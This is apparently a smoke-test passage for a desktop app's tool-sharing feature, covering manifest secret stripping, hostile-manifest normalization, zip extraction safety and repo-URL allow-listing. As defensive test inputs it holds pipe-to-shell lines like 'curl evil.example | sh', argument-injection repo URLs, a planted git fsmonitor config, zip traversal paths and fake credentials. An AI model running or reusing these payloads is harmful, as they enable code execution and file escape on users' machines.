/**
 * Tool Sharing (1.2) smoke — engine level, plus shelf_export_tool over the
 * real stdio MCP server.
 *
 *  1. Manifest round-trip (build → serialize → read → normalize) preserves
 *     fields and unknown keys.
 *  2. Secret stripping: a tool WITH env secrets exports a manifest with
 *     ZERO values; credential-looking free text refuses export.
 *  3. Hostile manifest normalization: injected command in name, value
 *     smuggled into env, non-loopback url, bad agent access, path traversal
 *     in name → inert, bounded, folder-safe.
 *  4. Zip safety: bundle excludes node_modules/.git/.env; extraction refuses
 *     `../`, absolute paths and symlinks.
 *  5. shelf://add parsing + repo URL allow-list.
 *  6. Receive end-to-end through a local git daemon: stage → (consent) →
 *     confirm → tool running with manifest capabilities/agent access + env
 *     values + provenance; discard cleans the scratch dir.
 *  7. Updates: clean copy → updates_available with commits + manifest diff →
 *     fast-forward applies unchanged fields; diverged copy → honest
 *     'diverged' → take_theirs resets.
 *  8. shelf_export_tool over MCP: manifest path + link, no env values.
 *
 * Requires: tsc -p tsconfig.electron.json and npm run mcp:build.
 */
import assert from 'node:assert/strict'
import { execFileSync, spawn } from 'node:child_process'
import fs from 'node:fs'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createRequire } from 'node:module'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const root = path.resolve(__dirname, '..')
const require = createRequire(import.meta.url)

const { LibraryStore } = require('../dist-electron/shared/library-store')
const { ProcessManager } = require('../dist-electron/shared/process-manager')
const { ReceiptStore } = require('../dist-electron/shared/receipt-store')
const { parseShelfUrl } = require('../dist-electron/shared/shelf-url')
const {
  buildManifest,
  diffManifests,
  folderNameFor,
  normalizeManifest,
  readManifest,
  serializeManifest,
  writeManifest,
} = require('../dist-electron/shared/tool-manifest')
const {
  applyToolUpdate,
  buildShareLink,
  checkToolUpdates,
  confirmStagedShare,
  discardStagedShare,
  exportToolBundle,
  exportToolManifest,
  stageSharedTool,
  validateDestination,
  validateRepoUrl,
} = require('../dist-electron/shared/tool-share')
const { bundleFolder, buildZip, extractZip, isSafeZipPath, listZip } = require('../dist-electron/shared/zip')

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shelf-sharing-'))
const dataRoot = path.join(tmp, 'data')
const toolsRoot = path.join(tmp, 'Shelf Tools')
fs.mkdirSync(dataRoot, { recursive: true })
const store = new LibraryStore(dataRoot)
const receipts = new ReceiptStore(dataRoot)
const processes = new ProcessManager(store, { receipts })
const cleanup = []

const git = (cwd, ...args) =>
  execFileSync('git', ['-C', cwd, ...args], {
    encoding: 'utf8',
    env: { ...process.env, GIT_AUTHOR_NAME: 'Smoke', GIT_AUTHOR_EMAIL: 's@x', GIT_COMMITTER_NAME: 'Smoke', GIT_COMMITTER_EMAIL: 's@x' },
  }).trim()

function freePort() {
  return new Promise((resolve) => {
    const srv = net.createServer()
    srv.listen(0, '127.0.0.1', () => {
      const { port } = srv.address()
      srv.close(() => resolve(port))
    })
  })
}

/** Sample web tool project (dependency-less, honours PORT). */
function writeFixtureProject(dir, { withSecretEnvFile = true } = {}) {
  fs.mkdirSync(dir, { recursive: true })
  fs.copyFileSync(path.join(root, 'fixtures/sample-tool/server.mjs'), path.join(dir, 'server.mjs'))
  fs.writeFileSync(
    path.join(dir, 'package.json'),
    JSON.stringify({ name: 'shared-fixture', private: true, scripts: { start: 'node server.mjs' } }, null, 2),
  )
  fs.mkdirSync(path.join(dir, 'node_modules', 'leftpad'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'node_modules', 'leftpad', 'index.js'), '// dep')
  if (withSecretEnvFile) fs.writeFileSync(path.join(dir, '.env'), 'OPENAI_API_KEY=sk-live-1234567890abcdefghijklmnop\n')
  fs.writeFileSync(path.join(dir, '.env.example'), 'OPENAI_API_KEY=\n')
  fs.writeFileSync(path.join(dir, '.npmrc'), '//registry.npmjs.org/:_authToken=npm_' + 'x'.repeat(36) + '\n')
  fs.writeFileSync(path.join(dir, 'deploy.pem'), '-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n')
}

try {
  // -------------------------------------------------------------------------
  // 1 + 2. Manifest build: structural secret stripping + round-trip.
  // -------------------------------------------------------------------------
  const senderProject = path.join(tmp, 'sender', 'image-prepper')
  writeFixtureProject(senderProject)
  const senderPort = await freePort()
  const secretValue = 'sk-live-1234567890abcdefghijklmnop'
  const dbValue = 'postgres://user:hunter2@localhost/db'
  const sender = store.save({
    id: '',
    name: 'Image Prepper',
    description: 'Batch image resize/optimize for client sites',
    tags: ['image', 'utility'],
    capabilities: ['batch-optimize images', 'resize photos'],
    agentAccess: [
      { id: '', kind: 'mcp', transport: 'stdio', entrypoint: 'node ./mcp/server.js', setupRequired: true, notes: 'Needs the venv.' },
    ],
    favorite: false,
    projectPath: senderProject,
    launchCommand: 'node server.mjs',
    url: `http://localhost:${senderPort}/`,
    port: senderPort,
    env: { OPENAI_API_KEY: secretValue, DATABASE_URL: dbValue, PORT: String(senderPort) },
    notes: 'Run once with the sample images folder.',
    createdAt: '', updatedAt: '',
  })

  // A hand-edited previous manifest with hints + an unknown field.
  fs.writeFileSync(
    path.join(senderProject, 'shelf.json'),
    JSON.stringify({
      shelfManifest: 1,
      name: 'old',
      launchCommand: 'old',
      env: { OPENAI_API_KEY: 'Your OpenAI key (platform.openai.com)', DATABASE_URL: dbValue },
      bootstrap: ['npm install'],
      futureField: { keep: 'me' },
    }),
  )
  const exported = await exportToolManifest(sender, { appVersion: '1.2.0-smoke' })
  const onDisk = fs.readFileSync(exported.manifestPath, 'utf8')
  assert.ok(!onDisk.includes(secretValue), 'manifest must not contain the API key value')
  assert.ok(!onDisk.includes('hunter2'), 'manifest must not contain the DATABASE_URL value')
  const parsed = JSON.parse(onDisk)
  assert.equal(parsed.shelfManifest, 1)
  assert.deepEqual(Object.keys(parsed.env).sort(), ['DATABASE_URL', 'OPENAI_API_KEY', 'PORT'])
  assert.equal(parsed.env.OPENAI_API_KEY, 'Your OpenAI key (platform.openai.com)', 'hand-written hint preserved')
  assert.equal(parsed.env.DATABASE_URL, '', 'a "hint" equal to the stored value is dropped')
  assert.equal(parsed.env.PORT, '')
  assert.deepEqual(parsed.bootstrap, ['npm install'], 'bootstrap from the previous manifest kept')
  assert.deepEqual(parsed.futureField, { keep: 'me' }, 'unknown field preserved through export')
  assert.equal(parsed.name, 'Image Prepper')
  assert.equal(parsed.port, senderPort)
  assert.equal(parsed.agentAccess[0].entrypoint, 'node ./mcp/server.js')
  assert.equal(parsed.agentAccess[0].id, undefined, 'ids are local; never exported')
  assert.equal(exported.link, undefined, 'no git remote → no link')
  console.log('OK: manifest export strips every env value structurally')

  const reread = readManifest(senderProject)
  assert.equal(reread.warnings.length, 0)
  assert.deepEqual(reread.manifest.capabilities, ['batch-optimize images', 'resize photos'])
  assert.deepEqual(reread.manifest.extra, { futureField: { keep: 'me' } })
  const again = serializeManifest(reread.manifest)
  assert.equal(again, onDisk, 'serialize(normalize(x)) is stable')
  console.log('OK: manifest round-trip is stable and preserves unknown fields')

  // Refusals: credential in free text, inline KEY=value in the command.
  const leaky = buildManifest({ ...sender, notes: `token ${secretValue}` }, { appVersion: 'x' })
  assert.equal(leaky.ok, false)
  assert.match(leaky.reason, /credential/i)
  const inlineSecret = buildManifest({ ...sender, launchCommand: 'API_KEY=abc node server.mjs' }, { appVersion: 'x' })
  assert.equal(inlineSecret.ok, false)
  // Non-secret-named prefixes are still values in another pocket — refused.
  const inline = buildManifest({ ...sender, launchCommand: 'MY_FLAG=abc node server.mjs' }, { appVersion: 'x' })
  assert.equal(inline.ok, false)
  assert.match(inline.reason, /MY_FLAG/)
  const portOk = buildManifest({ ...sender, launchCommand: 'PORT=3000 node server.mjs' }, { appVersion: 'x' })
  assert.equal(portOk.ok, true, 'PORT= prefix is operational, not secret')
  const bearer = buildManifest({ ...sender, description: 'use Bearer abcdefghijklmnop' }, { appVersion: 'x' })
  assert.equal(bearer.ok, false)
  const nestedExtra = buildManifest(sender, {
    appVersion: 'x',
    previous: { ...reread.manifest, extra: { nested: { deep: `token ${secretValue}` } } },
  })
  assert.equal(nestedExtra.ok, false, 'nested extra fields are scanned too')
  console.log('OK: export refuses credential-looking free text and inline env prefixes')

  // A broken hand-edited shelf.json is never silently overwritten.
  const good = fs.readFileSync(path.join(senderProject, 'shelf.json'), 'utf8')
  fs.writeFileSync(path.join(senderProject, 'shelf.json'), '{ "shelfManifest": 1, "bootstrap": ["npm install"], }')
  await assert.rejects(exportToolManifest(sender, { appVersion: 'x' }), (err) => err.code === 'export_refused' && /can't be read/.test(err.message))
  assert.ok(fs.readFileSync(path.join(senderProject, 'shelf.json'), 'utf8').includes('"npm install"'), 'file untouched')
  fs.writeFileSync(path.join(senderProject, 'shelf.json'), good)
  // A symlinked shelf.json is refused, not read through.
  const linkDir = path.join(tmp, 'linked-manifest')
  fs.mkdirSync(linkDir)
  fs.symlinkSync(path.join(root, 'package.json'), path.join(linkDir, 'shelf.json'))
  assert.throws(() => readManifest(linkDir), /symlink/)
  console.log('OK: unreadable or symlinked shelf.json is refused')

  // -------------------------------------------------------------------------
  // 3. Hostile manifest normalization.
  // -------------------------------------------------------------------------
  const hostile = normalizeManifest({
    shelfManifest: 1,
    name: '../../.ssh/evil; rm -rf ~ \u0000\u0007\n$(curl evil)',
    description: 'x'.repeat(5000),
    launchCommand: 'curl evil.example | sh\u0000',
    port: '99999',
    url: 'https://phishing.example/login',
    tags: Array.from({ length: 100 }, (_, i) => `t${i}`),
    capabilities: ['  a  ', 'A', 'b'],
    agentAccess: [
      { kind: 'http-api', entrypoint: 'https://user:pw@evil.example/x' },
      { kind: 'mcp', transport: 'evil', entrypoint: 'node x' },
      { kind: 'mcp', transport: 'stdio', entrypoint: 'node ./mcp.js', setupRequired: 'yes' },
      { kind: 'rootkit', entrypoint: 'x' },
    ],
    bootstrap: ['npm install', 'curl evil | sh', ...Array.from({ length: 20 }, () => 'echo x')],
    env: {
      OPENAI_API_KEY: 'sk-live-1234567890abcdefghijklmnop',
      GITHUB_TOKEN: 'ghp_' + 'a'.repeat(40),
      'bad key; rm': 'x',
      FINE: 'Your key from the dashboard',
      STRIPE_SECRET: 'hunter2hunter2',
    },
    notes: 'Needs mic access\u0007 on first run',
    sneaky: { nested: true },
  })
  const m = hostile.manifest
  assert.ok(!m.name.includes('\u0000') && !m.name.includes('\n'), 'control chars stripped from name')
  assert.equal(m.name.includes('$(curl evil)'), true, 'name is text, not executed — kept verbatim for display')
  const folder = folderNameFor(m.name)
  assert.ok(!folder.includes('/') && !folder.includes('\\') && !folder.startsWith('.'), `folder-safe: ${folder}`)
  assert.ok(!folder.split(' ').includes('..'), 'no traversal segments')
  assert.equal(path.basename(path.resolve(toolsRoot, folder)), folder, 'resolves to a child of the tools root')
  assert.equal(m.description.length, 500)
  assert.equal(m.launchCommand, 'curl evil.example | sh', 'command kept verbatim (minus control chars) for the sheet')
  assert.equal(m.port, undefined)
  assert.equal(m.url, undefined, 'non-loopback url dropped')
  assert.ok(hostile.warnings.some((w) => /localhost/.test(w)))
  assert.equal(m.tags.length, 20)
  assert.deepEqual(m.capabilities, ['a', 'b'])
  assert.equal(m.agentAccess.length, 1, 'only the valid stdio MCP entry survives')
  assert.equal(m.agentAccess[0].transport, 'stdio')
  assert.equal(m.agentAccess[0].setupRequired, true)
  assert.equal(m.bootstrap.length, 10)
  assert.equal(m.bootstrap[1], 'curl evil | sh', 'bootstrap rendered verbatim, never run')
  assert.deepEqual(Object.keys(m.env).sort(), ['FINE', 'GITHUB_TOKEN', 'OPENAI_API_KEY', 'STRIPE_SECRET'])
  assert.equal(m.env.OPENAI_API_KEY, '', 'smuggled value discarded')
  assert.equal(m.env.GITHUB_TOKEN, '', 'smuggled GitHub token discarded')
  assert.equal(m.env.STRIPE_SECRET, '', 'single-token hint on a secret-named key discarded')
  assert.equal(m.env.FINE, 'Your key from the dashboard')
  assert.ok(!JSON.stringify(m).includes('sk-live-'), 'no credential survives normalization')
  assert.equal(m.notes, 'Needs mic access on first run')
  assert.deepEqual(m.extra, { sneaky: { nested: true } })
  assert.throws(() => normalizeManifest({ shelfManifest: 2 }), /Unsupported manifest version/)
  assert.throws(() => normalizeManifest([]), /not a JSON object/)
  assert.throws(() => normalizeManifest(null), /not a JSON object/)
  // port/url must agree — the launch path opens url as soon as port answers.
  const mismatch = normalizeManifest({ shelfManifest: 1, port: 4173, url: 'http://localhost:9999/admin' })
  assert.equal(mismatch.manifest.url, 'http://localhost:4173/admin', 'url follows port')
  assert.ok(mismatch.warnings.some((w) => /different port/.test(w)))
  const urlOnly = normalizeManifest({ shelfManifest: 1, url: 'http://127.0.0.1:4173/' })
  assert.equal(urlOnly.manifest.port, 4173, 'port derived from url')
  const bareManifest = normalizeManifest({ shelfManifest: 1 })
  assert.equal(bareManifest.manifest.name, "")
  assert.ok(bareManifest.warnings.some((w) => /no usable name/.test(w)))
  console.log('OK: hostile manifest normalizes to inert, bounded, folder-safe data')

  // -------------------------------------------------------------------------
  // 4. Zip safety.
  // -------------------------------------------------------------------------
  const bundleBytes = bundleFolder(senderProject)
  const bundleFile = path.join(tmp, 'bundle.zip')
  fs.writeFileSync(bundleFile, bundleBytes)
  const names = listZip(bundleFile)
  assert.ok(names.includes('shelf.json'))
  assert.ok(names.includes('server.mjs'))
  assert.ok(names.includes('.env.example'))
  assert.ok(!names.some((n) => n.startsWith('node_modules')), 'node_modules excluded')
  assert.ok(!names.includes('.env'), '.env never travels in a bundle')
  assert.ok(!names.includes('.npmrc') && !names.includes('deploy.pem'), 'credential files excluded')
  const bundleText = bundleBytes.toString('latin1')
  assert.ok(!bundleText.includes(secretValue), 'bundle bytes carry no env secret')
  console.log('OK: bundle excludes node_modules/.git/.env and carries no secret')

  const evilZip = buildZip([
    { name: '../escape.txt', data: Buffer.from('escaped') },
    { name: '/abs/escape.txt', data: Buffer.from('escaped') },
    { name: 'ok/../../escape2.txt', data: Buffer.from('escaped') },
    { name: 'link', data: Buffer.from('/etc'), mode: 0o777 },
    { name: 'fine.txt', data: Buffer.from('fine') },
    { name: 'sub/', data: Buffer.alloc(0) },
    { name: 'sub/deep.txt', data: Buffer.from('deep') },
    // A planted repo: core.fsmonitor would run on the receiver's next `git status`.
    { name: '.git/', data: Buffer.alloc(0) },
    { name: '.git/config', data: Buffer.from('[core]\n\tfsmonitor = /tmp/evil.sh\n') },
    { name: '.git/hooks/post-checkout', data: Buffer.from('#!/bin/sh\ntouch pwned\n'), mode: 0o755 },
  ])
  // Mark `link` as a symlink entry (unix mode 0120777 in external attrs).
  const linkNameOffset = evilZip.indexOf(Buffer.from('link'), evilZip.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02])))
  evilZip.writeUInt32LE((0o120777 << 16) >>> 0, linkNameOffset - 46 + 38)
  const evilFile = path.join(tmp, 'evil.zip')
  fs.writeFileSync(evilFile, evilZip)
  const dest = path.join(tmp, 'extract', 'dest')
  const extracted = extractZip(evilFile, dest)
  assert.equal(extracted.files, 2)
  assert.deepEqual(
    extracted.skipped.sort(),
    ['../escape.txt', '/abs/escape.txt', 'link', 'ok/../../escape2.txt', '.git/', '.git/config', '.git/hooks/post-checkout'].sort(),
  )
  assert.ok(!fs.existsSync(path.join(dest, '.git')), 'no .git planted from a bundle')
  assert.ok(!fs.existsSync(path.join(tmp, 'extract', 'escape.txt')))
  assert.ok(!fs.existsSync(path.join(tmp, 'escape2.txt')))
  assert.ok(!fs.existsSync('/abs/escape.txt'))
  assert.ok(!fs.existsSync(path.join(dest, 'link')))
  assert.equal(fs.readFileSync(path.join(dest, 'sub', 'deep.txt'), 'utf8'), 'deep')
  // .git at any depth, case-folded — a planted repo config would execute on
  // the receiver's next `git status`.
  assert.equal(isSafeZipPath('.git/config'), false)
  assert.equal(isSafeZipPath('.GIT/config'), false)
  assert.equal(isSafeZipPath('wrapper/.git/hooks/post-checkout'), false)
  assert.equal(isSafeZipPath('a\\b'), false)
  assert.equal(isSafeZipPath('C:/x'), false)
  assert.equal(isSafeZipPath('./x'), false)
  assert.equal(isSafeZipPath('a/./b'), false)
  assert.equal(isSafeZipPath('a/b'), true)
  assert.throws(() => extractZip(path.join(root, 'package.json'), path.join(tmp, 'x')), /Not a ZIP/)
  console.log('OK: zip extraction refuses traversal, absolute paths, and symlinks')

  // -------------------------------------------------------------------------
  // 5. shelf://add + repo allow-list.
  // -------------------------------------------------------------------------
  const add = parseShelfUrl('shelf://add?repo=https%3A%2F%2Fgithub.com%2Forg%2Ftool.git')
  assert.equal(add.action, 'add')
  assert.equal(add.repo, 'https://github.com/org/tool.git')
  assert.equal(add.route, '/')
  assert.equal(parseShelfUrl('shelf://add').action, 'open', 'add without repo is a plain open')
  const preConfirm = parseShelfUrl('shelf://add?repo=https%3A%2F%2Fx.y%2Fz&runSetup=1&confirm=true&env=K%3DV')
  assert.equal(preConfirm.action, 'add')
  assert.deepEqual(Object.keys(preConfirm).sort(), ['action', 'repo', 'route'], 'no consent-shaped params leak through')
  assert.equal(buildShareLink('git@github.com:org/tool.git'), 'shelf://add?repo=git%40github.com%3Aorg%2Ftool.git')
  assert.equal(parseShelfUrl(buildShareLink('git@github.com:org/tool.git')).repo, 'git@github.com:org/tool.git')

  assert.equal(validateRepoUrl('https://github.com/org/tool.git').ok, true)
  assert.equal(validateRepoUrl('ssh://git@github.com/org/tool.git').ok, true)
  assert.equal(validateRepoUrl('git@github.com:org/tool.git').ok, true)
  assert.equal(validateRepoUrl('git://127.0.0.1:9418/repo').ok, true)
  for (const bad of [
    '',
    'file:///etc/passwd',
    'ext::sh -c "curl evil | sh"',
    '-oProxyCommand=evil',
    '--upload-pack=evil',
    '/Users/me/repo',
    'http://insecure.example/repo',
    'https://user:pw@host/repo',
    'https://host/repo with space',
    'ftp://host/repo',
    'ssh://-oProxyCommand=evil/repo',
    'ssh://-x@host/repo',
  ]) {
    assert.equal(validateRepoUrl(bad).ok, false, `must reject: ${JSON.stringify(bad)}`)
  }
  console.log('OK: shelf://add parses repo only; repo URLs are allow-listed')

  // -------------------------------------------------------------------------
  // 6. Receive end-to-end via a local git daemon.
  // -------------------------------------------------------------------------
  const daemonRoot = path.join(tmp, 'daemon')
  const bare = path.join(daemonRoot, 'image-prepper.git')
  fs.mkdirSync(daemonRoot, { recursive: true })
  execFileSync('git', ['init', '--bare', '-q', '--initial-branch=main', bare])
  fs.writeFileSync(path.join(bare, 'git-daemon-export-ok'), '')
  // Sender commits the project (shelf.json included) and pushes.
  git(senderProject, 'init', '-q', '--initial-branch=main')
  fs.writeFileSync(path.join(senderProject, '.gitignore'), 'node_modules\n.env\n')
  git(senderProject, 'add', '-A')
  git(senderProject, 'commit', '-q', '-m', 'Initial shared tool')
  const daemonPort = await freePort()
  git(senderProject, 'remote', 'add', 'origin', `git://127.0.0.1:${daemonPort}/image-prepper.git`)
  git(senderProject, 'push', '-q', '--set-upstream', `file://${bare}`, 'main')
  execFileSync('git', ['-C', bare, 'symbolic-ref', 'HEAD', 'refs/heads/main'])
  const daemon = spawn(
    'git',
    ['daemon', '--reuseaddr', `--port=${daemonPort}`, '--listen=127.0.0.1', `--base-path=${daemonRoot}`, '--export-all', daemonRoot],
    { stdio: 'ignore' },
  )
  cleanup.push(() => daemon.kill('SIGTERM'))
  await new Promise((resolve) => setTimeout(resolve, 600))
  const repoUrl = `git://127.0.0.1:${daemonPort}/image-prepper.git`

  // Sender share link now resolves from the remote.
  const withRemote = await exportToolManifest(store.get(sender.id), { appVersion: '1.2.0-smoke' })
  assert.equal(withRemote.remote, repoUrl)
  assert.equal(withRemote.link, buildShareLink(repoUrl))
  assert.equal(parseShelfUrl(withRemote.link).repo, repoUrl)
  console.log('OK: share link built from the project remote')

  // A tool in a SUBFOLDER of its repo gets no link (the clone would be the wrong folder).
  const subDir = path.join(senderProject, 'tools', 'sub-tool')
  fs.mkdirSync(subDir, { recursive: true })
  fs.writeFileSync(path.join(subDir, 'package.json'), JSON.stringify({ name: 'sub', scripts: { start: 'node ../../server.mjs' } }))
  const subTool = store.save({ ...sender, id: '', name: 'Sub Tool', projectPath: subDir, env: {} })
  const subExport = await exportToolManifest(subTool, { appVersion: 'x' })
  assert.equal(subExport.link, undefined)
  assert.match(subExport.linkNote, /subfolder/)
  assert.ok(fs.existsSync(path.join(subDir, 'shelf.json')))
  store.delete(subTool.id)
  fs.rmSync(path.join(senderProject, 'tools'), { recursive: true, force: true })
  console.log('OK: subfolder-of-repo tools get a manifest but no misleading link')

  // Receiver: fresh data root.
  const rxRoot = path.join(tmp, 'receiver-data')
  fs.mkdirSync(rxRoot)
  const rxStore = new LibraryStore(rxRoot)
  const rxReceipts = new ReceiptStore(rxRoot)
  const rxProcesses = new ProcessManager(rxStore, { receipts: rxReceipts })

  const stage = await stageSharedTool({ kind: 'git', repo: repoUrl }, { dataRoot: rxRoot, toolsRoot })
  assert.equal(stage.manifestFound, true)
  assert.equal(stage.manifest.name, 'Image Prepper')
  assert.equal(stage.destination, path.join(toolsRoot, 'Image Prepper'))
  assert.ok(stage.stagePath.startsWith(path.join(rxRoot, 'staging')))
  assert.ok(fs.existsSync(path.join(stage.stagePath, 'server.mjs')))
  assert.ok(!fs.existsSync(path.join(stage.stagePath, '.env')), 'gitignored .env never arrives')
  assert.ok(stage.ref && stage.ref.length === 40)
  assert.deepEqual(stage.setupSteps.map((s) => s.command), ['npm install'], 'declared setup shown verbatim')
  assert.equal(rxStore.list().length, 0, 'staging persists nothing in the library')
  assert.ok(!fs.existsSync(stage.destination), 'staging writes nothing to the destination')
  console.log('OK: staged clone describes the sheet without persisting or running anything')

  // Cancel path: scratch dir is gone, nothing else touched.
  discardStagedShare(stage, rxRoot)
  assert.ok(!fs.existsSync(path.join(rxRoot, 'staging', stage.stageId)))
  assert.equal(rxStore.list().length, 0)
  console.log('OK: discard removes the scratch clone')

  // A stale library entry pointing at the default destination must not be
  // merged into (it would swallow the manifest + typed env values).
  const ghost = rxStore.save({ id: '', name: 'Ghost', tags: [], capabilities: [], agentAccess: [], favorite: false, projectPath: path.join(toolsRoot, 'Image Prepper'), launchCommand: 'node x', createdAt: '', updatedAt: '' })
  const stageGhost = await stageSharedTool({ kind: 'git', repo: repoUrl }, { dataRoot: rxRoot, toolsRoot, isTaken: (p) => Boolean(rxStore.findByProjectPath(p)) })
  assert.equal(stageGhost.destination, path.join(toolsRoot, 'Image Prepper-2'), 'library-claimed path skipped')
  await assert.rejects(
    confirmStagedShare({ ...stageGhost, setupSteps: [] }, { destination: path.join(toolsRoot, 'Image Prepper'), env: {}, runSetup: false, launch: false }, { store: rxStore, processes: rxProcesses, dataRoot: rxRoot }),
    (err) => err.code === 'destination_invalid' && /Ghost/.test(err.message),
  )
  assert.ok(fs.existsSync(stageGhost.stagePath), 'stage survives a destination refusal')
  discardStagedShare(stageGhost, rxRoot)
  rxStore.delete(ghost.id)
  console.log('OK: a library entry already at the destination is refused, never merged into')

  // A repo tracking a symlink that escapes its folder is refused at stage time.
  const linkRepoDir = path.join(tmp, 'link-src')
  writeFixtureProject(linkRepoDir, { withSecretEnvFile: false })
  fs.symlinkSync('/etc', path.join(linkRepoDir, 'etc-link'))
  const linkBare = path.join(daemonRoot, 'linky.git')
  execFileSync('git', ['init', '--bare', '-q', '--initial-branch=main', linkBare])
  git(linkRepoDir, 'init', '-q', '--initial-branch=main')
  git(linkRepoDir, 'add', '-A')
  git(linkRepoDir, 'commit', '-q', '-m', 'link')
  git(linkRepoDir, 'push', '-q', `file://${linkBare}`, 'main')
  execFileSync('git', ['-C', linkBare, 'symbolic-ref', 'HEAD', 'refs/heads/main'])
  await assert.rejects(
    stageSharedTool({ kind: 'git', repo: `git://127.0.0.1:${daemonPort}/linky.git` }, { dataRoot: rxRoot, toolsRoot }),
    (err) => err.code === 'clone_failed' && /symlink/.test(err.message),
  )
  console.log('OK: escaping symlinks in a shared repo are refused')

  // An INTERNAL relative symlink must be allowed even though the data root
  // lives under /var → /private/var (the audit walks the realpath).
  const okLinkDir = path.join(tmp, 'oklink-src')
  writeFixtureProject(okLinkDir, { withSecretEnvFile: false })
  fs.mkdirSync(path.join(okLinkDir, 'sub'))
  fs.symlinkSync('../server.mjs', path.join(okLinkDir, 'sub', 'alias.mjs'))
  const okBare = path.join(daemonRoot, 'oklink.git')
  execFileSync('git', ['init', '--bare', '-q', '--initial-branch=main', okBare])
  git(okLinkDir, 'init', '-q', '--initial-branch=main')
  git(okLinkDir, 'add', '-A')
  git(okLinkDir, 'commit', '-q', '-m', 'ok link')
  git(okLinkDir, 'push', '-q', `file://${okBare}`, 'main')
  execFileSync('git', ['-C', okBare, 'symbolic-ref', 'HEAD', 'refs/heads/main'])
  const okStage = await stageSharedTool({ kind: 'git', repo: `git://127.0.0.1:${daemonPort}/oklink.git` }, { dataRoot: rxRoot, toolsRoot })
  assert.ok(okStage.stageId, 'internal relative symlink is allowed')
  discardStagedShare(okStage, rxRoot)
  console.log('OK: internal relative symlinks are allowed (audit walks realpath)')

  // Destination validation.
  const stage2 = await stageSharedTool({ kind: 'git', repo: repoUrl }, { dataRoot: rxRoot, toolsRoot })
  assert.equal(validateDestination('/', stage2).ok, false)
  assert.equal(validateDestination(stage2.stagePath, stage2).ok, false)
  assert.equal(validateDestination(root, stage2).ok, false, 'non-empty folder refused')
  assert.equal(validateDestination(path.join(toolsRoot, 'fresh'), stage2).ok, true)

  // Approve: drop the declared `npm install` (dependency-less fixture would
  // still succeed, but exercising setupSteps override = "what was shown runs").
  const confirmed = await confirmStagedShare(
    { ...stage2, setupSteps: [{ command: 'echo SETUP_RAN > setup.marker', label: 'Setup step from the shared manifest' }] },
    { destination: stage2.destination, env: { OPENAI_API_KEY: 'rx-key-value', DATABASE_URL: '', PORT: '' }, runSetup: true },
    { store: rxStore, processes: rxProcesses, dataRoot: rxRoot },
  )
  assert.equal(confirmed.outcome, 'launched', confirmed.state?.message)
  assert.equal(confirmed.destination, path.join(toolsRoot, 'Image Prepper'))
  assert.ok(fs.existsSync(path.join(confirmed.destination, 'setup.marker')), 'consented setup ran in the destination')
  assert.ok(!fs.existsSync(path.join(rxRoot, 'staging', stage2.stageId)), 'scratch cleared after move')
  const rxTool = rxStore.get(confirmed.tool.id)
  assert.equal(rxTool.name, 'Image Prepper')
  assert.equal(rxTool.projectPath, confirmed.destination)
  assert.deepEqual(rxTool.capabilities, ['batch-optimize images', 'resize photos'])
  assert.equal(rxTool.agentAccess.length, 1)
  assert.equal(rxTool.agentAccess[0].entrypoint, 'node ./mcp/server.js')
  assert.deepEqual(rxTool.tags, ['image', 'utility'])
  assert.equal(rxTool.env.OPENAI_API_KEY, 'rx-key-value', 'typed env value stored')
  assert.equal('DATABASE_URL' in rxTool.env, false, 'empty inputs are not stored')
  assert.equal(rxTool.source.kind, 'git')
  assert.equal(rxTool.source.repo, repoUrl)
  assert.equal(rxTool.source.ref, stage2.ref)
  assert.ok(rxTool.source.addedAt)
  assert.equal(confirmed.state.status, 'running')
  assert.ok(rxTool.port, 'port present (manifest port or healed)')
  const rxLib = JSON.parse(fs.readFileSync(path.join(rxRoot, 'library.json'), 'utf8'))
  assert.equal(rxLib.tools[0].source.repo, repoUrl, 'source survives the save literal + normalize')
  await rxProcesses.stop(rxTool.id)
  console.log(`OK: confirmed add → running on port ${rxTool.port} with capabilities, access, env, provenance`)

  // Second add of the same repo gets a fresh sibling folder, not a clobber.
  const stage3 = await stageSharedTool({ kind: 'git', repo: repoUrl }, { dataRoot: rxRoot, toolsRoot })
  assert.equal(stage3.destination, path.join(toolsRoot, 'Image Prepper-2'))
  discardStagedShare(stage3, rxRoot)

  // A bundle whose wrapper folder smuggles a .git is refused at stage time
  // (belt-and-braces over isSafeZipPath).
  const gitWrapDir = path.join(tmp, 'gitwrap')
  fs.mkdirSync(path.join(gitWrapDir, 'inner', '.git'), { recursive: true })
  writeFixtureProject(path.join(gitWrapDir, 'inner'), { withSecretEnvFile: false })
  fs.writeFileSync(path.join(gitWrapDir, 'inner', '.git', 'config'), '[core]\n\tfsmonitor = /tmp/evil.sh\n')
  const wrapZip = buildZip(
    (function walk(dir, rel) {
      const out = []
      for (const d of fs.readdirSync(dir, { withFileTypes: true })) {
        const r = rel ? `${rel}/${d.name}` : d.name
        if (d.isDirectory()) { out.push({ name: `${r}/`, data: Buffer.alloc(0) }); out.push(...walk(path.join(dir, d.name), r)) }
        else out.push({ name: r, data: fs.readFileSync(path.join(dir, d.name)) })
      }
      return out
    })(gitWrapDir, ''),
  )
  const wrapFile = path.join(tmp, 'gitwrap.zip')
  fs.writeFileSync(wrapFile, wrapZip)
  const wrapStage = await stageSharedTool({ kind: 'bundle', bundlePath: wrapFile }, { dataRoot: rxRoot, toolsRoot })
  // isSafeZipPath strips every .git entry at extract, so the staged tree is
  // clean (no repo to execute) — the safer outcome than refusing the bundle.
  assert.ok(!fs.existsSync(path.join(wrapStage.stagePath, '.git')), 'embedded .git stripped from a bundle')
  assert.ok(fs.existsSync(path.join(wrapStage.stagePath, 'server.mjs')), 'the rest of the project survives')
  discardStagedShare(wrapStage, rxRoot)
  console.log('OK: an embedded .git is stripped from a bundle, project kept')

  // Bundle receive path (no git).
  const bundle2 = await exportToolBundle(store.get(sender.id), path.join(tmp, 'share.zip'), { appVersion: '1.2.0-smoke' })
  assert.ok(bundle2.bytes > 0)
  const stageB = await stageSharedTool({ kind: 'bundle', bundlePath: bundle2.bundlePath }, { dataRoot: rxRoot, toolsRoot })
  assert.equal(stageB.manifestFound, true)
  assert.equal(stageB.source.kind, 'bundle')
  assert.equal(stageB.ref, undefined)
